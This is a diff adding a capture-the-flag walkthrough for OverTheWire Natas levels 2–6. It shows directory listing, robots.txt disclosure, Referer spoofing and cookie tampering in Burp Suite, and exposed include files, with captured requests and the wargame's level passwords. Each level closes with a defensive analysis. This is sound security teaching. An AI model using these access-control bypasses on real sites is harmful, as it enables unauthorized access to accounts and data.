@@ -129,12 +129,59 @@ Username: natas2
 Password: TguMNxKo1DSa1tujBLuZJnDUlCcUAPlI
 ```
 After login, the following note is displayed: 
+```
+There is nothing on this page
+```
 
 ### Approach 
+The page did not display any obvious information related to the next level.  
+To investigate further, the page source was accessed using: **CTRL + U**
+
+Below is the content of the page source: 
+```html
+<html>
+<head>
+<!-- This stuff in the header has nothing to do with the level -->
+<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
+<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
+<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
+<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
+<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
+<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
+<script>var wechallinfo = { "level": "natas2", "pass": "TguMNxKo1DSa1tujBLuZJnDUlCcUAPlI" };</script></head>
+<body>
+<h1>natas2</h1>
+<div id="content">
+There is nothing on this page
+<img src="files/pixel.png">
+</div>
+</body></html>
+```
+
+Within the source code, the line `<img src="files/pixel.png">` was identified. This indicated the existence of a directory named `/files/`. 
+
+By navigating to: `http://natas2.natas.labs.overthewire.org/files/`, a directory listing was revealed.
 
 ### Finding 
+The `/files/` directory contains `pixel.png` and `users.txt`
+
+Upon accessing users.txt, the following credentials were found:
+```txt
+# username:password
+alice:BYNdCesZqW
+bob:jw2ueICLvT
+charlie:G5vCxkVV3m
+natas3:3gqisGdR0pjm6tpkDKdIWO2hSvchLeYH
+eve:zo4mJWyNj2
+mallory:9urtcpzBmH
+```
+The password for natas3 was successfully obtained.
 
 ### Analysis
+This level demonstrates a common directory listing vulnerability, where sensitive files are exposed due to improper server configuration. The presence of the `/files/` directory, combined with directory indexing enabled, allowed unauthorized users to browse and access internal files. The `users.txt` file contained plaintext credentials, leading directly to the next level.
+
+This highlights the importance of securing server directories by disabling directory listing and restricting access to sensitive files. Additionally, storing credentials in plaintext within accessible directories is a critical security flaw that should always be avoided.
+
 
 ---
 
@@ -142,15 +189,58 @@ After login, the following note is displayed:
 ```
 URL: http://natas3.natas.labs.overthewire.org
 Username: natas3
-Password: 
+Password: 3gqisGdR0pjm6tpkDKdIWO2hSvchLeYH
 ```
 After login, the following note is displayed: 
+```
+There is nothing on this page
+```
 
 ### Approach 
+Below is the initial inspection of the webpage and its source code (**CTRL + U**): 
+```html
+<html>
+<head>
+<!-- This stuff in the header has nothing to do with the level -->
+<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
+<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
+<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
+<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
+<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
+<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
+<script>var wechallinfo = { "level": "natas3", "pass": "3gqisGdR0pjm6tpkDKdIWO2hSvchLeYH" };</script></head>
+<body>
+<h1>natas3</h1>
+<div id="content">
+There is nothing on this page
+<!-- No more information leaks!! Not even Google will find it this time... -->
+</div>
+</body></html>
+```
+but did not reveal any useful information.
+
+As an alternative approach, common hidden paths were explored. The file `robots.txt` was accessed via `http://natas3.natas.labs.overthewire.org/robots.txt`. This file is typically used to instruct search engines on which directories should not be indexed.
 
 ### Finding 
+The `robots.txt` file contained the following entry:
+```txt
+User-agent: *
+Disallow: /s3cr3t/
+```
+
+This revealed a hidden directory: `/s3cr3t/`. Navigating to the directory: `http://natas3.natas.labs.overthewire.org/s3cr3t/`. A file named `users.txt` was discovered. Accessing it revealed:
+```txt
+natas4:QryZXc2e0zahULdHrtHxzyYkj59kUxLQ
+```
+The password for **natas4** was successfully obtained.
 
 ### Analysis
+This level demonstrates improper handling of sensitive directories through the use of `robots.txt`. While this file is intended to guide search engine crawlers, it does not enforce access restrictions and is publicly accessible to anyone.
+
+By listing `/s3cr3t/` in `robots.txt`, the application unintentionally exposed the location of a sensitive directory. Since no additional access controls were implemented, it was possible to directly navigate to the directory and retrieve confidential information.
+
+This highlights that `robots.txt` should not be relied upon as a security mechanism. Sensitive resources must be properly secured using authentication and authorization controls, rather than simply being hidden from search engines.
+
 
 ---
 
@@ -158,15 +248,80 @@ After login, the following note is displayed:
 ```
 URL: http://natas4.natas.labs.overthewire.org
 Username: natas4
-Password: 
+Password: QryZXc2e0zahULdHrtHxzyYkj59kUxLQ
 ```
 After login, the following note is displayed: 
+```
+Access disallowed. You are visiting from "" while authorized users should come only from "http://natas5.natas.labs.overthewire.org/"
+```
+After clicking `Refresh page`, we are navigating to `http://natas4.natas.labs.overthewire.org/index.php` and the following note is displayed:
+```
+Access disallowed. You are visiting from "http://natas4.natas.labs.overthewire.org/" while authorized users should come only from "http://natas5.natas.labs.overthewire.org/"
+```
+After clicking the `Refresh page` again, we are navigating to the same page `http://natas4.natas.labs.overthewire.org/index.php`, and the following note is displayed: 
+```
+Access disallowed. You are visiting from "http://natas4.natas.labs.overthewire.org/index.php" while authorized users should come only from "http://natas5.natas.labs.overthewire.org/"
+```
 
 ### Approach 
+This suggests that the server is validating the **HTTP Referer header** to control access. To bypass this restriction, configure the proxy setting and turn on the intercept of the burpsuite. Then, the content below is captured through HTTP history: 
+```
+GET /index.php HTTP/1.1
+Host: natas4.natas.labs.overthewire.org
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Authorization: Basic bmF0YXM0OlFyeVpYYzJlMHphaFVMZEhydEh4enlZa2o1OWtVeExR
+Connection: keep-alive
+Referer: http://natas4.natas.labs.overthewire.org/index.php
+Cookie: _ga_RD0K2239G0=GS2.1.s1775744396$o2$g0$t1775744396$j60$l0$h0; _ga=GA1.1.1340419348.1775651007
+Upgrade-Insecure-Requests: 1
+```
+
+Next, send the captured request to repeater and modify the referer from `Referer: http://natas4.natas.labs.overthewire.org/index.php` to `Referer: http://natas5.natas.labs.overthewire.org/`. Then send the request. 
 
 ### Finding 
+After that, you will obtain the response below: 
+```html
+HTTP/1.1 200 OK
+Date: Sat, 11 Apr 2026 14:36:22 GMT
+Server: Apache/2.4.58 (Ubuntu)
+Vary: Accept-Encoding
+Content-Length: 962
+Keep-Alive: timeout=5, max=100
+Connection: Keep-Alive
+Content-Type: text/html; charset=UTF-8
+
+<html>
+<head>
+<!-- This stuff in the header has nothing to do with the level -->
+<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
+<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
+<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
+<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
+<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
+<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
+<script>var wechallinfo = { "level": "natas4", "pass": "QryZXc2e0zahULdHrtHxzyYkj59kUxLQ" };</script></head>
+<body>
+<h1>natas4</h1>
+<div id="content">
+
+Access granted. The password for natas5 is 0n35PkggAPm2zbEpOU802c0x0Msn1ToK
+<br/>
+<div id="viewsource"><a href="index.php">Refresh page</a></div>
+</div>
+</body>
+</html>
+```
+Then, the password for natas5 is successfully obtained.
 
 ### Analysis
+This level demonstrates a Referer header-based access control vulnerability. The application relies on the client-supplied Referer header to determine whether a request is authorized.
+
+Since HTTP headers can be easily modified by an attacker using tools like Burp Suite, this form of access control is inherently insecure. The server does not perform proper validation or authentication, allowing attackers to spoof the expected request origin.
+
+This highlights that client-controlled data, such as HTTP headers, should never be trusted for enforcing security mechanisms. Proper access control should be implemented server-side using robust authentication and authorization techniques.
 
 ---
 
@@ -175,15 +330,102 @@ After login, the following note is displayed:
 ```
 URL: http://natas5.natas.labs.overthewire.org
 Username: natas5
-Password: 
+Password: 0n35PkggAPm2zbEpOU802c0x0Msn1ToK
 ```
 After login, the following note is displayed: 
+```
+Access disallowed. You are not logged in
+```
 
 ### Approach 
+To do the investigation, the burpsuite is used and the intercept is turned on. Then, refresh the page again and get the request and forward it. Then, request and response below is collected from http history. 
+Content of the request: 
+```html
+GET / HTTP/1.1
+Host: natas5.natas.labs.overthewire.org
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Authorization: Basic bmF0YXM1OjBuMzVQa2dnQVBtMnpiRXBPVTgwMmMweDBNc24xVG9L
+Connection: keep-alive
+Cookie: _ga_RD0K2239G0=GS2.1.s1775744396$o2$g0$t1775744396$j60$l0$h0; _ga=GA1.1.1340419348.1775651007; loggedin=0
+Upgrade-Insecure-Requests: 1
+```
+
+Content of the response
+```html
+HTTP/1.1 200 OK
+Date: Sat, 11 Apr 2026 14:57:37 GMT
+Server: Apache/2.4.58 (Ubuntu)
+Set-Cookie: loggedin=0
+Vary: Accept-Encoding
+Content-Length: 855
+Keep-Alive: timeout=5, max=100
+Connection: Keep-Alive
+Content-Type: text/html; charset=UTF-8
+
+<html>
+<head>
+<!-- This stuff in the header has nothing to do with the level -->
+<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
+<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
+<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
+<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
+<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
+<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
+<script>var wechallinfo = { "level": "natas5", "pass": "0n35PkggAPm2zbEpOU802c0x0Msn1ToK" };</script></head>
+<body>
+<h1>natas5</h1>
+<div id="content">
+Access disallowed. You are not logged in</div>
+</body>
+</html>
+```
+
+Through observation, it was identified that the application uses a cookie parameter (`loggedin`) to manage authentication state.
+
+Next, the request is sent to the repeater and the loggedin parameter in cookie is modified from `Cookie: _ga_RD0K2239G0=GS2.1.s1775744396$o2$g0$t1775744396$j60$l0$h0; _ga=GA1.1.1340419348.1775651007; loggedin=0` to `Cookie: _ga_RD0K2239G0=GS2.1.s1775744396$o2$g0$t1775744396$j60$l0$h0; _ga=GA1.1.1340419348.1775651007; loggedin=1`. The modified request was then resent to the server.
+
 
 ### Finding 
+After sending the request, the following response is returned: 
+```html
+HTTP/1.1 200 OK
+Date: Sat, 11 Apr 2026 15:03:55 GMT
+Server: Apache/2.4.58 (Ubuntu)
+Set-Cookie: loggedin=1
+Vary: Accept-Encoding
+Content-Length: 890
+Keep-Alive: timeout=5, max=100
+Connection: Keep-Alive
+Content-Type: text/html; charset=UTF-8
+
+<html>
+<head>
+<!-- This stuff in the header has nothing to do with the level -->
+<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
+<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
+<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
+<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
+<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
+<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
+<script>var wechallinfo = { "level": "natas5", "pass": "0n35PkggAPm2zbEpOU802c0x0Msn1ToK" };</script></head>
+<body>
+<h1>natas5</h1>
+<div id="content">
+Access granted. The password for natas6 is 0RoJwHdSKWFTYR5WuiAewauSuNaBXned</div>
+</body>
+</html>
+```
 
 ### Analysis
+This level demonstrates a cookie-based authentication vulnerability, where the application relies on client-side data to determine whether a user is authenticated.
+
+Since cookies are stored and controlled by the client, they can be easily modified using tools like Burp Suite. By simply changing the loggedin value from 0 to 1, it was possible to bypass authentication without valid credentials.
+
+This highlights a critical security flaw: client-side data should never be trusted for authentication or authorization decisions. Proper session management must be enforced on the server side, where session states are securely validated and cannot be manipulated by the user.
+
 
 ---
 
@@ -192,15 +434,73 @@ After login, the following note is displayed:
 ```
 URL: http://natas6.natas.labs.overthewire.org
 Username: natas6
-Password: 
+Password: 0RoJwHdSKWFTYR5WuiAewauSuNaBXned
 ```
-After login, the following note is displayed: 
+After logging in, the webpage displayed an input field labeled **“Input secret”**, along with a submit button. Initial testing with arbitrary values such as `aaa` and `bbb` returned the response: `Wrong secret`.
+
+Additionally, a **View Sourcecode** link was available for further inspection. Below is the content of the source code: 
+```html
+<html>
+<head>
+<!-- This stuff in the header has nothing to do with the level -->
+<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
+<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
+<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
+<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
+<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
+<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
+<script>var wechallinfo = { "level": "natas6", "pass": "<censored>" };</script></head>
+<body>
+<h1>natas6</h1>
+<div id="content">
+
+<?
+
+include "includes/secret.inc";
+
+    if(array_key_exists("submit", $_POST)) {
+        if($secret == $_POST['secret']) {
+        print "Access granted. The password for natas7 is <censored>";
+    } else {
+        print "Wrong secret";
+    }
+    }
+?>
+
+<form method=post>
+Input secret: <input name=secret><br>
+<input type=submit name=submit>
+</form>
+
+<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
+</div>
+</body>
+</html>
+```
+
+### Finding
+By reviewing the source code, it was observed that the server-side PHP implementation includes "includes/secret.inc“.
 
 ### Approach 
+Further investigation was performed by navigating to ·http://natas6.natas.labs.overthewire.org/includes/secret.inc·, where the following content was obtained.
+```
+<?
+$secret = "FOEIUWGHFEEUHOFUOIU";
+?>
+```
 
-### Finding 
+The value `FOEIUWGHFEEUHOFUOIU` was then tested as the input secret and submitted. The following response was returned:
+```
+Access granted. The password for natas7 is bmg8SvU1LizuWjx3y7xkNERkHxGre0GS
+```
 
 ### Analysis
+This level demonstrates a **poor server-side security practice**, where sensitive information is stored in an accessible file within the web directory structure.
+
+Although the secret value is not directly shown in the main application, it can still be retrieved by directly accessing the included file due to improper access control. This exposes a **path disclosure and information leakage vulnerability**.
+
+Sensitive data such as secrets, credentials, or configuration values should never be stored in publicly accessible web directories. Additionally, server-side files should be properly protected to prevent direct access.
+
 
 ---
 
